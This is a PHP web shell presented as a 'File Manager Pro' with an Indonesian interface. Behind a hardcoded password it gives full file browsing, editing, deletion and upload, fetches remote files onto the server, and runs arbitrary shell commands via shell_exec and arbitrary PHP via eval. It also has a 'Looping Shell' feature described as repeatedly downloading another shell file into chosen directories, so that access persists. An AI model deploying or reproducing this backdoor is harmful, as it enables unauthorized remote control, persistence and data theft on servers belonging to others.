<?php
session_start();

$password_hash = md5('1337x'); // GANTI PASSWORD DI SINI

// LOGOUT
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ?');
    exit;
}

// LOGIN
$login_error = '';
if (!isset($_SESSION['logged_in'])) {
    if (isset($_POST['password'])) {
        if (md5($_POST['password']) === $password_hash) {
            $_SESSION['logged_in'] = true;
            header('Location: ?');
            exit;
        } else {
            $login_error = 'Password salah!';
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - File Manager</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
        <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
        <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
                min-height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            .login-container { perspective: 1000px; }
            .login-card {
                background: rgba(255,255,255,0.08);
                backdrop-filter: blur(20px);
                border-radius: 24px;
                padding: 50px 40px;
                width: 420px;
                border: 1px solid rgba(255,255,255,0.12);
                box-shadow: 0 25px 60px rgba(0,0,0,0.5);
                transform-style: preserve-3d;
                transition: transform 0.4s ease;
            }
            .login-card:hover { transform: rotateX(2deg) translateY(-5px); }
            .login-icon {
                width: 90px; height: 90px;
                background: linear-gradient(135deg,#667eea,#764ba2);
                border-radius: 50%;
                display: flex; align-items: center; justify-content: center;
                margin: 0 auto 25px; font-size: 40px; color: white;
                box-shadow: 0 10px 30px rgba(102,126,234,0.4);
            }
            .login-title { color: white; font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 8px; }
            .login-sub { color: rgba(255,255,255,0.5); text-align: center; margin-bottom: 35px; font-size: 14px; }
            .form-control {
                background: rgba(255,255,255,0.06);
                border: 1px solid rgba(255,255,255,0.12);
                border-radius: 12px; color: white;
                padding: 14px 18px; font-size: 15px; transition: all 0.3s;
            }
            .form-control:focus {
                background: rgba(255,255,255,0.1);
                border-color: #667eea;
                box-shadow: 0 0 0 3px rgba(102,126,234,0.25);
                color: white;
            }
            .form-control::placeholder { color: rgba(255,255,255,0.3); }
            .btn-login {
                background: linear-gradient(135deg,#667eea,#764ba2);
                border: none; border-radius: 12px;
                padding: 14px; font-size: 16px; font-weight: 600; color: white;
                width: 100%; cursor: pointer; transition: all 0.3s; margin-top: 10px;
            }
            .btn-login:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(102,126,234,0.4); }
            .input-group-text {
                background: rgba(255,255,255,0.06);
                border: 1px solid rgba(255,255,255,0.12);
                border-right: none; border-radius: 12px 0 0 12px;
                color: rgba(255,255,255,0.5);
            }
            .input-group .form-control { border-left: none; border-radius: 0 12px 12px 0; }
        </style>
    </head>
    <body>
        <div class="login-container">
            <div class="login-card">
                <div class="login-icon"><i class="fas fa-folder-open"></i></div>
                <h1 class="login-title">File Manager</h1>
                <p class="login-sub">Masukkan password untuk mengakses</p>
                <form method="POST" id="loginForm">
                    <div class="input-group mb-4">
                        <span class="input-group-text"><i class="fas fa-lock"></i></span>
                        <input type="password" name="password" class="form-control" placeholder="Password" required autofocus>
                    </div>
                    <button type="submit" class="btn-login"><i class="fas fa-sign-in-alt me-2"></i>MASUK</button>
                </form>
            </div>
        </div>
        <?php if ($login_error): ?>
        <script>
            Swal.fire({
                icon: 'error', title: 'Gagal!', text: '<?php echo $login_error; ?>',
                background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea', backdrop: 'rgba(0,0,0,0.7)'
            });
        </script>
        <?php endif; ?>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
        <script>
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                if (!this.querySelector('input[name=password]').value) {
                    e.preventDefault();
                    Swal.fire({ icon: 'warning', title: 'Oops!', text: 'Password tidak boleh kosong!', background: '#1a1a2e', color: '#fff', confirmButtonColor: '#667eea' });
                }
            });
        </script>
    </body>
    </html>
    <?php
    exit;
}

// SUDAH LOGIN ================================================================

$rawDir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
$rawDir = str_replace('\\', '/', $rawDir);
$dir = realpath($rawDir);
if (!$dir) {
    $dir = getcwd();
}
$dir = str_replace('\\', '/', $dir);

$message = '';
$msgType = 'success';

// Fungsi hapus folder rekursif
function rrmdir($path) {
    $items = scandir($path);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $path . '/' . $item;
        if (is_dir($p)) {
            rrmdir($p);
        } else {
            unlink($p);
        }
    }
    rmdir($path);
}

// DELETE
if (isset($_GET['delete'])) {
    $target = $dir . '/' . basename($_GET['delete']);
    if (is_file($target)) {
        unlink($target);
        $message = 'File berhasil dihapus!';
    } elseif (is_dir($target)) {
        rrmdir($target);
        $message = 'Folder berhasil dihapus!';
    }
}

// RENAME
if (isset($_POST['rename'])) {
    $oldName = $dir . '/' . basename($_POST['old_name']);
    $newName = $dir . '/' . basename($_POST['new_name']);
    if (file_exists($oldName)) {
        if (!file_exists($newName)) {
            rename($oldName, $newName);
            $message = 'Berhasil rename menjadi: ' . basename($newName);
        } else {
            $message = 'Nama "' . basename($newName) . '" sudah ada!';
            $msgType = 'error';
        }
    } else {
        $message = 'File/folder tidak ditemukan!';
        $msgType = 'error';
    }
}

// CREATE FOLDER
if (isset($_POST['new_folder'])) {
    $newDir = $dir . '/' . basename($_POST['folder_name']);
    if (!file_exists($newDir)) {
        mkdir($newDir, 0755);
        $message = 'Folder berhasil dibuat!';
    } else {
        $message = 'Folder sudah ada!';
        $msgType = 'error';
    }
}

// UPLOAD FILE
if (isset($_FILES['upload_file'])) {
    $file = $_FILES['upload_file'];
    if ($file['error'] === UPLOAD_ERR_OK) {
        move_uploaded_file($file['tmp_name'], $dir . '/' . basename($file['name']));
        $message = 'File berhasil diupload!';
    }
}

// SAVE EDIT
if (isset($_POST['save_file'])) {
    $savePath = $dir . '/' . basename($_POST['file_name']);
    file_put_contents($savePath, $_POST['content']);
    $message = 'File berhasil disimpan!';
}

// GET FILE CONTENT FOR EDIT
$editFileName = '';
$editFileContent = '';
$editing = false;
if (isset($_GET['edit'])) {
    $editTarget = $dir . '/' . basename($_GET['edit']);
    if (is_file($editTarget)) {
        $editFileName = basename($_GET['edit']);
        $editFileContent = file_get_contents($editTarget);
        $editing = true;
    } else {
        $message = 'File tidak ditemukan!';
        $msgType = 'error';
    }
}

// AJAX HANDLER
if (isset($_GET['ajax'])) {
    header('Content-Type: application/json');
    if ($_GET['ajax'] === 'upload') {
        if (isset($_FILES['file'])) {
            $f = $_FILES['file'];
            if ($f['error'] === UPLOAD_ERR_OK) {
                $dest = $dir . '/' . basename($f['name']);
                if (move_uploaded_file($f['tmp_name'], $dest)) {
                    echo json_encode(['success' => true, 'message' => 'Upload: ' . $f['name']]);
                } else {
                    echo json_encode(['error' => 'Gagal simpan']);
                }
            } else {
                echo json_encode(['error' => 'Error upload']);
            }
        } elseif (isset($_POST['remote_url'])) {
            $content = @file_get_contents($_POST['remote_url']);
            if ($content !== false) {
                $name = basename(parse_url($_POST['remote_url'], PHP_URL_PATH));
                if (!$name) $name = 'remote_' . time() . '.bin';
                file_put_contents($dir . '/' . $name, $content);
                echo json_encode(['success' => true, 'message' => 'Remote OK: ' . $name]);
            } else {
                echo json_encode(['error' => 'Gagal download']);
            }
        } else {
            echo json_encode(['error' => 'No file']);
        }
        exit;
    }
    if ($_GET['ajax'] === 'getfile' && isset($_GET['file'])) {
        $fpath = $dir . '/' . basename($_GET['file']);
        if (is_file($fpath)) {
            $content = file_get_contents($fpath);
            echo $content;
            exit;
        }
        echo 'File tidak ditemukan';
        exit;
    }
    exit;
}

// COMMAND SHELL
$cmdOutput = '';
if (isset($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $phpPrefix = '<?php';
    if (substr($cmd, 0, strlen($phpPrefix)) === $phpPrefix) {
        ob_start();
        try {
            $phpCode = substr($cmd, strlen($phpPrefix));
            eval($phpCode);
        } catch (Throwable $e) {
            echo $e->getMessage();
        }
        $cmdOutput = ob_get_clean();
    } else {
        $cmdOutput = shell_exec($cmd . ' 2>&1');
    }
}

// SCAN DIRECTORY
$items = scandir($dir);
$folders = array();
$files = array();
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $full = $dir . '/' . $item;
    if (is_dir($full)) $folders[] = $item;
    else $files[] = $item;
}
sort($folders);
sort($files);

$parentDir = str_replace('\\', '/', dirname($dir));

function cleanPath($p) { return str_replace('\\', '/', $p); }

function buildBreadcrumb($path) {
    $parts = explode('/', $path);
    $cumulative = '';
    $links = [];
    foreach ($parts as $i => $part) {
        if ($part === '') continue;
        $cumulative .= '/' . $part;
        if ($i === count($parts) - 1) {
            $links[] = '<span style="color:#667eea;font-weight:600;">' . htmlspecialchars($part) . '</span>';
        } else {
            $links[] = '<a href="?dir=' . urlencode($cumulative) . '" style="color:rgba(255,255,255,0.5);text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color=\'#667eea\'" onmouseout="this.style.color=\'rgba(255,255,255,0.5)\'">' . htmlspecialchars($part) . '</a>';
        }
    }
    array_unshift($links, '<a href="?dir=/" style="color:rgba(255,255,255,0.5);text-decoration:none;transition:color 0.2s;" onmouseover="this.style.color=\'#667eea\'" onmouseout="this.style.color=\'rgba(255,255,255,0.5)\'"><i class="fas fa-home"></i></a>');
    return implode(' <span style="color:rgba(255,255,255,0.2);">/</span> ', $links);
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager Pro</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0f0f1a; color: #e0e0e0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; min-height: 100vh; }
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #1a1a2e; }
        ::-webkit-scrollbar-thumb { background: #667eea; border-radius: 3px; }
        .navbar { background: rgba(15,15,26,0.95); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.06); padding: 12px 24px; }
        .navbar-brand { font-weight: 700; font-size: 22px; background: linear-gradient(135deg,#667eea,#764ba2); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .navbar .btn { border-radius: 10px; padding: 8px 18px; font-size: 13px; font-weight: 600; }
        .breadcrumb-path { background: rgba(255,255,255,0.06); border-radius: 10px; padding: 8px 16px; font-size: 13px; flex: 1; max-width: 500px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
        .breadcrumb-path i { margin-right: 6px; color: #667eea; }
        .main-container { padding: 20px 24px; }
        .glass-card { background: rgba(255,255,255,0.04); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; padding: 20px; transition: all 0.3s; margin-bottom: 20px; }
        .file-item { display: flex; align-items: center; padding: 10px 14px; border-radius: 10px; transition: all 0.2s; text-decoration: none; color: #e0e0e0; border-bottom: 1px solid rgba(255,255,255,0.03); }
        .file-item:hover { background: rgba(102,126,234,0.08); }
        .file-item .icon { width: 38px; height: 38px; border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 18px; margin-right: 14px; flex-shrink: 0; }
        .file-item .icon.folder { background: rgba(255,193,7,0.15); color: #ffc107; }
        .file-item .icon.file { background: rgba(102,126,234,0.15); color: #667eea; }
        .file-item .fname { flex: 1; font-size: 14px; font-weight: 500; }
        .file-item .fname a { text-decoration: none; color: inherit; }
        .file-item .fname a.folder-link:hover { color: #ffc107; }
        .file-item .fname a.file-link:hover { color: #667eea; }
        .file-item .fsize { font-size: 12px; color: rgba(255,255,255,0.4); margin-right: 20px; }
        .file-item .factions { opacity: 0.4; transition: opacity 0.2s; }
        .file-item:hover .factions { opacity: 1; }
        .file-item .factions a { color: rgba(255,255,255,0.5); margin: 0 6px; font-size: 14px; transition: color 0.2s; text-decoration: none; }
        .file-item .factions a:hover { color: #667eea; }
        .file-item .factions a.danger:hover { color: #ff4757; }
        .file-item .factions a.rename:hover { color: #ffc107; }
        .section-title { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; color: rgba(255,255,255,0.3); margin-bottom: 14px; padding-bottom: 10px; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .form-control, .form-select { background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); border-radius: 10px; color: #e0e0e0; padding: 10px 14px; }
        .form-control:focus, .form-select:focus { background: rgba(255,255,255,0.1); border-color: #667eea; box-shadow: 0 0 0 3px rgba(102,126,234,0.2); color: #e0e0e0; }
        .form-control::placeholder { color: rgba(255,255,255,0.25); }
        .form-select option { background: #1a1a2e; color: #e0e0e0; }
        textarea.form-control { font-family: Consolas, Monaco, 'Courier New', monospace; font-size: 13px; line-height: 1.5; }
        .btn-glass { background: rgba(102,126,234,0.15); border: 1px solid rgba(102,126,234,0.25); border-radius: 10px; color: #667eea; padding: 8px 18px; font-size: 13px; font-weight: 600; transition: all 0.3s; }
        .btn-glass:hover { background: rgba(102,126,234,0.25); color: white; transform: translateY(-1px); }
        .btn-glass-success { background: rgba(46,213,115,0.15); border: 1px solid rgba(46,213,115,0.25); color: #2ed573; }
        .btn-glass-success:hover { background: rgba(46,213,115,0.25); color: white; }
        .btn-glass-danger { background: rgba(255,71,87,0.15); border: 1px solid rgba(255,71,87,0.25); color: #ff4757; }
        .btn-glass-danger:hover { background: rgba(255,71,87,0.25); color: white; }
        .btn-glass-warning { background: rgba(255,193,7,0.15); border: 1px solid rgba(255,193,7,0.25); color: #ffc107; }
        .btn-glass-warning:hover { background: rgba(255,193,7,0.25); color: white; }
        .btn-glass-info { background: rgba(72,202,228,0.15); border: 1px solid rgba(72,202,228,0.25); color: #48cae4; }
        .btn-glass-info:hover { background: rgba(72,202,228,0.25); color: white; }

        /* Tombol Looping Shell - warna merah menyala */
        .btn-glass-loop {
            background: rgba(255, 71, 87, 0.2);
            border: 1px solid rgba(255, 71, 87, 0.4);
            border-radius: 10px;
            color: #ff4757;
            padding: 8px 18px;
            font-size: 13px;
            font-weight: 600;
            transition: all 0.3s;
            animation: pulse-loop 2s infinite;
        }
        .btn-glass-loop:hover {
            background: rgba(255, 71, 87, 0.35);
            color: white;
            transform: translateY(-1px);
        }
        .btn-glass-loop.active {
            background: #ff4757;
            color: white;
            animation: none;
        }
        @keyframes pulse-loop {
            0%, 100% { box-shadow: 0 0 0 0 rgba(255, 71, 87, 0.4); }
            50% { box-shadow: 0 0 0 8px rgba(255, 71, 87, 0); }
        }

        .cmd-output { background: #0a0a15; border: 1px solid rgba(102,126,234,0.2); border-radius: 10px; padding: 16px; font-family: Consolas, Monaco, 'Courier New', monospace; font-size: 13px; color: #48cae4; max-height: 350px; overflow: auto; white-space: pre-wrap; }
        .table-custom { font-size: 13px; }
        .table-custom th { color: rgba(255,255,255,0.4); border-bottom: 1px solid rgba(255,255,255,0.06); font-weight: 600; text-transform: uppercase; font-size: 11px; padding: 10px 12px; }
        .table-custom td { color: #e0e0e0; border-bottom: 1px solid rgba(255,255,255,0.03); padding: 10px 12px; }
        .table-custom tr:hover td { background: rgba(102,126,234,0.05); }
        .modal-content { background: #1a1a2e; border: 1px solid rgba(255,255,255,0.08); border-radius: 16px; color: #e0e0e0; }
        .modal-header { border-bottom: 1px solid rgba(255,255,255,0.06); padding: 20px 24px; }
        .modal-footer { border-top: 1px solid rgba(255,255,255,0.06); padding: 16px 24px; }
        .modal .btn-close { filter: invert(1); }
        pre { margin: 0; }
        .text-muted-custom { color: rgba(255,255,255,0.35); }
        .progress-upload { background: rgba(255,255,255,0.06); border-radius: 10px; height: 8px; overflow: hidden; }
        .progress-upload .progress-bar { background: linear-gradient(135deg,#667eea,#764ba2); border-radius: 10px; }
        .editor-section { border: 1px solid rgba(102,126,234,0.2); border-radius: 16px; overflow: hidden; }
        .editor-header { background: rgba(102,126,234,0.1); padding: 12px 20px; border-bottom: 1px solid rgba(102,126,234,0.2); display: flex; justify-content: space-between; align-items: center; }
        .editor-header .file-label { color: #667eea; font-weight: 600; }
        .editor-body { padding: 0; }
        .editor-body textarea { border: none; border-radius: 0; background: #0a0a15; color: #48cae4; resize: vertical; min-height: 300px; }
        .editor-body textarea:focus { box-shadow: none; border: none; }
        .editor-footer { background: rgba(102,126,234,0.05); padding: 12px 20px; border-top: 1px solid rgba(102,126,234,0.1); }

        /* Toast untuk looping shell */
        .loop-toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            z-index: 9999;
            background: rgba(255, 71, 87, 0.95);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 71, 87, 0.5);
            border-radius: 12px;
            padding: 14px 20px;
            color: white;
            font-size: 13px;
            font-weight: 600;
            box-shadow: 0 10px 30px rgba(255, 71, 87, 0.3);
            display: none;
            align-items: center;
            gap: 10px;
            animation: slideInUp 0.3s ease;
        }
        .loop-toast .spinner-border {
            width: 18px;
            height: 18px;
            border-width: 2px;
            color: white;
        }
        @keyframes slideInUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
    </style>
</head>
<body>

<nav class="navbar">
    <div class="container-fluid">
        <a class="navbar-brand" href="#"><i class="fas fa-folder-open me-2"></i>FileManager Pro</a>
        <div class="d-flex align-items-center gap-3" style="max-width:70%;">
            <div class="breadcrumb-path"><i class="fas fa-folder"></i> <?php echo buildBreadcrumb($dir); ?></div>
            <a href="?dir=<?php echo urlencode($parentDir); ?>" class="btn btn-glass btn-sm" title="Back"><i class="fas fa-arrow-up"></i></a>
            <?php if ($editing): ?>
            <a href="?dir=<?php echo $dir; ?>" class="btn btn-glass-danger btn-sm"><i class="fas fa-times me-1"></i>Tutup Editor</a>
            <?php endif; ?>
            <!-- TOMBOL LOOPING SHELL -->
            <button class="btn btn-glass-loop btn-sm" id="loopShellBtn" title="Looping Shell - Download shellph8.php terus menerus">
                <i class="fas fa-sync-alt me-1"></i><span id="loopBtnText">Looping Shell</span>
            </button>
            <a href="?logout=1" class="btn btn-glass-danger btn-sm"><i class="fas fa-sign-out-alt me-1"></i>Logout</a>
        </div>
    </div>
</nav>

<div class="main-container">
    <div class="row">
        <div class="col-lg-<?php echo $editing ? '5' : '7'; ?>">
            <div class="glass-card">
                <div class="d-flex justify-content-between align-items-center mb-3">
                    <div class="section-title mb-0"><i class="fas fa-list me-2"></i>File Explorer</div>
                    <div class="d-flex gap-2">
                        <button class="btn btn-glass btn-sm" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="fas fa-upload me-1"></i>Upload</button>
                        <button class="btn btn-glass btn-sm" data-bs-toggle="modal" data-bs-target="#newFolderModal"><i class="fas fa-folder-plus me-1"></i>New Folder</button>
                        <button class="btn btn-glass btn-sm" data-bs-toggle="modal" data-bs-target="#remoteModal"><i class="fas fa-cloud-download-alt me-1"></i>Remote</button>
                    </div>
                </div>
                <?php
                if (count($folders) > 0) {
                    echo '<div class="mb-1 text-muted-custom small" style="padding:0 14px;"><i class="fas fa-folder me-1"></i>FOLDERS (' . count($folders) . ')</div>';
                    foreach ($folders as $folder) {
                        $folderPath = cleanPath($dir . '/' . $folder);
                        echo '<div class="file-item"><div class="icon folder"><i class="fas fa-folder"></i></div>';
                        echo '<span class="fname"><a href="?dir=' . urlencode($folderPath) . '" class="folder-link">' . htmlspecialchars($folder) . '</a></span>';
                        echo '<span class="fsize">folder</span>';
                        echo '<span class="factions">';
                        echo '<a href="javascript:void(0)" onclick="openRename(\'' . htmlspecialchars($folder) . '\',\'folder\')" class="rename" title="Rename"><i class="fas fa-pen"></i></a>';
                        echo '<a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($folder) . '" class="danger" onclick="return confirmDelete(\'' . htmlspecialchars($folder) . '\', event)" title="Hapus"><i class="fas fa-trash-alt"></i></a>';
                        echo '</span></div>';
                    }
                }
                if (count($files) > 0) {
                    echo '<div class="mt-3 mb-1 text-muted-custom small" style="padding:0 14px;"><i class="fas fa-file me-1"></i>FILES (' . count($files) . ')</div>';
                    foreach ($files as $file) {
                        $fsize = is_file($dir . '/' . $file) ? filesize($dir . '/' . $file) : 0;
                        $fsizeStr = $fsize > 1048576 ? round($fsize/1048576,1).' MB' : ($fsize > 1024 ? round($fsize/1024,1).' KB' : $fsize.' B');
                        $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
                        $icon = in_array($ext,['php','html','htm','js','css','txt','json','xml','md','py','rb','sh','sql']) ? 'fa-file-code' : (in_array($ext,['jpg','jpeg','png','gif','bmp','svg','webp','ico']) ? 'fa-file-image' : (in_array($ext,['zip','rar','tar','gz','7z']) ? 'fa-file-archive' : (in_array($ext,['pdf']) ? 'fa-file-pdf' : 'fa-file')));
                        echo '<div class="file-item"><div class="icon file"><i class="fas ' . $icon . '"></i></div>';
                        echo '<span class="fname"><a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '" class="file-link">' . htmlspecialchars($file) . '</a></span>';
                        echo '<span class="fsize">' . $fsizeStr . '</span>';
                        echo '<span class="factions">';
                        echo '<a href="?dir=' . urlencode($dir) . '&edit=' . urlencode($file) . '" title="Edit"><i class="fas fa-edit"></i></a>';
                        echo '<a href="javascript:void(0)" onclick="openRename(\'' . htmlspecialchars($file) . '\',\'file\')" class="rename" title="Rename"><i class="fas fa-pen"></i></a>';
                        echo '<a href="?dir=' . urlencode($dir) . '&delete=' . urlencode($file) . '" class="danger" onclick="return confirmDelete(\'' . htmlspecialchars($file) . '\', event)" title="Hapus"><i class="fas fa-trash-alt"></i></a>';
                        echo '</span></div>';
                    }
                }
                if (count($folders) === 0 && count($files) === 0) {
                    echo '<div class="text-center py-5 text-muted-custom"><i class="fas fa-folder-open fa-3x mb-3" style="opacity:0.3;"></i><p>Folder ini kosong</p></div>';
                }
                ?>
            </div>
        </div>
        <div class="col-lg-<?php echo $editing ? '7' : '5'; ?>">
            <?php if ($editing): ?>
            <div class="editor-section">
                <div class="editor-header">
                    <span class="file-label"><i class="fas fa-edit me-2"></i>Editing: <?php echo htmlspecialchars($editFileName); ?></span>
                    <span class="text-muted-custom small"><?php echo htmlspecialchars($dir); ?></span>
                </div>
                <form method="POST">
                    <input type="hidden" name="save_file" value="1">
                    <input type="hidden" name="file_name" value="<?php echo htmlspecialchars($editFileName); ?>">
                    <div class="editor-body">
                        <textarea name="content" class="form-control" rows="25"><?php echo htmlspecialchars($editFileContent); ?></textarea>
                    </div>
                    <div class="editor-footer d-flex justify-content-between align-items-center">
                        <span class="text-muted-custom small"><i class="fas fa-info-circle me-1"></i>Tekan Ctrl+S untuk simpan</span>
                        <button type="submit" class="btn btn-glass-success"><i class="fas fa-save me-1"></i>Simpan Perubahan</button>
                    </div>
                </form>
            </div>
            <?php else: ?>
            <div class="glass-card">
                <div class="section-title"><i class="fas fa-terminal me-2"></i>Command Shell</div>
                <form method="POST">
                    <div class="input-group mb-2">
                        <input type="text" name="cmd" class="form-control" id="cmdInput" placeholder="command / " value="<?php echo htmlspecialchars(isset($_POST['cmd']) ? $_POST['cmd'] : ''); ?>" autocomplete="off">
                        <button type="submit" class="btn btn-glass"><i class="fas fa-play me-1"></i>Run</button>
                        <button type="button" class="btn btn-glass-info" onclick="document.getElementById('cmdInput').value='<?php echo '<?php phpinfo(); ?>'; ?>';document.getElementById('cmdInput').focus();">PHP</button>
                        <button type="button" class="btn btn-glass-success" onclick="document.getElementById('cmdInput').value='id';document.getElementById('cmdInput').focus();">BASH</button>
                    </div>
                </form>
                <?php
                if ($cmdOutput !== '') {
                    echo '<div class="cmd-output">' . htmlspecialchars($cmdOutput) . '</div>';
                } else {
                    echo '<div class="text-muted-custom text-center py-3 small"><i class="fas fa-terminal me-1"></i>Jalankan command untuk melihat output</div>';
                }
                ?>
            </div>
            <?php endif; ?>
        </div>
    </div>
</div>

<!-- Toast Looping Shell -->
<div id="loopToast" class="loop-toast">
    <div class="spinner-border" role="status"></div>
    <span id="loopToastText">Looping Shell sedang berjalan...</span>
</div>

<!-- ===== MODAL LOOPING DIRECTORY ===== -->
<div class="modal fade" id="loopDirModal" tabindex="-1">
    <div class="modal-dialog modal-dialog-centered"><div class="modal-content">
        <div class="modal-header" style="border-bottom-color:rgba(255,71,87,0.2);">
            <h5 class="modal-title" style="color:#ff4757;">
                <i class="fas fa-sync-alt me-2"></i>Looping Shell Directory
            </h5>
            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
        </div>
        <div class="modal-body">
            <!-- Tampilan uname -a -->
            <div class="mb-3">
                <label class="form-label" style="color:#48cae4;font-size:13px;">
                    <i class="fas fa-server me-1"></i> System Info
                </label>
                <div class="cmd-output" style="max-height:60px;font-size:12px;padding:10px 14px;" id="unameDisplay">
                    <?php 
                    $uname = shell_exec('uname -a 2>&1');
                    echo htmlspecialchars($uname ?: 'uname -a tidak tersedia'); 
                    ?>
                </div>
            </div>

            <form id="loopForm">
                <div class="mb-3">
                    <label class="form-label" style="color:#e0e0e0;font-size:13px;">
                        <i class="fas fa-folder me-1"></i> Direktori Target
                    </label>
                    <div class="input-group">
                        <span class="input-group-text" style="background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.1);border-radius:10px 0 0 10px;border-right:none;color:rgba(255,255,255,0.5);">
                            <i class="fas fa-folder-open"></i>
                        </span>
                        <input type="text" name="loop_dir" class="form-control" id="loopDirInput" 
                               value="<?php echo htmlspecialchars($dir); ?>" 
                               placeholder="/path/ke/direktori" required
                               style="border-left:none;border-radius:0 10px 10px 0;">
                    </div>
                    <div class="form-text text-muted-custom small mt-2">
                        <i class="fas fa-info-circle me-1"></i>
                        Masukkan path direktori tujuan untuk mendownload shell. 
                        Direktori akan dibuat otomatis jika belum ada.
                    </div>
                </div>

                <!-- Tombol Submit Looping -->
                <button type="submit" class="btn btn-glass-loop w-100" style="animation:none;padding:12px;font-size:15px;">
                    <i class="fas fa-play me-2"></i>Submit Looping
                </button>
            </form>
        </div>
    </div></div>
</div>

<!-- MODALS -->
<div class="modal fade" id="uploadModal" tabindex="-1">
    <div class="modal-dialog"><div class="modal-content">
        <div class="modal-header"><h5 class="modal-title"><i class="fas fa-upload me-2"></i>Upload File</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
        <div class="modal-body">
            <form id="uploadForm" enctype="multipart/form-data">
                <div class="mb-3"><label class="form-label">Pilih File</label><input type="file" name="file" class="form-control" id="fileInput"></div>
                <div id="uploadProgress" class="progress-upload mb-3" style="display:none;"><div class="progress-bar" id="progressBar" style="width:0%"></div></div>
                <button type="submit" class="btn-glass w-100"><i class="fas fa-upload me-1"></i>Upload</button>
            </form>
        </div>
    </div></div>
</div>
<div class="modal fade" id="newFolderModal" tabindex="-1">
    <div class="modal-dialog"><div class="modal-content">
        <div class="modal-header"><h5 class="modal-title"><i class="fas fa-folder-plus me-2"></i>Buat Folder Baru</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
        <div class="modal-body">
            <form method="POST">
                <input type="hidden" name="new_folder" value="1">
                <div class="mb-3"><label class="form-label">Nama Folder</label><input type="text" name="folder_name" class="form-control" placeholder="nama_folder" required></div>
                <button type="submit" class="btn-glass w-100"><i class="fas fa-plus me-1"></i>Buat</button>
            </form>
        </div>
    </div></div>
</div>
<div class="modal fade" id="remoteModal" tabindex="-1">
    <div class="modal-dialog"><div class="modal-content">
        <div class="modal-header"><h5 class="modal-title"><i class="fas fa-cloud-download-alt me-2"></i>Remote Upload</h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
        <div class="modal-body">
            <form id="remoteForm">
                <div class="mb-3"><label class="form-label">URL File</label><input type="url" name="remote_url" class="form-control" placeholder="https://example.com/" required id="remoteUrl"></div>
                <div id="remoteProgress" class="progress-upload mb-3" style="display:none;"><div class="progress-bar" id="remoteProgressBar" style="width:0%"></div></div>
                <button type="submit" class="btn-glass w-100"><i class="fas fa-download me-1"></i>Download & Upload</button>
            </form>
        </div>
    </div></div>
</div>
<div class="modal fade" id="renameModal" tabindex="-1">
    <div class="modal-dialog"><div class="modal-content">
        <div class="modal-header"><h5 class="modal-title"><i class="fas fa-pen me-2"></i>Rename <span id="renameType" style="color:#ffc107;"></span></h5><button type="button" class="btn-close" data-bs-dismiss="modal"></button></div>
        <div class="modal-body">
            <form method="POST" id="renameForm">
                <input type="hidden" name="rename" value="1">
                <input type="hidden" name="old_name" id="renameOld">
                <div class="mb-3"><label class="form-label">Nama Baru</label><input type="text" name="new_name" class="form-control" id="renameNew" placeholder="nama_baru" required></div>
                <button type="submit" class="btn-glass-warning w-100"><i class="fas fa-check me-1"></i>Rename</button>
            </form>
        </div>
    </div></div>
</div>

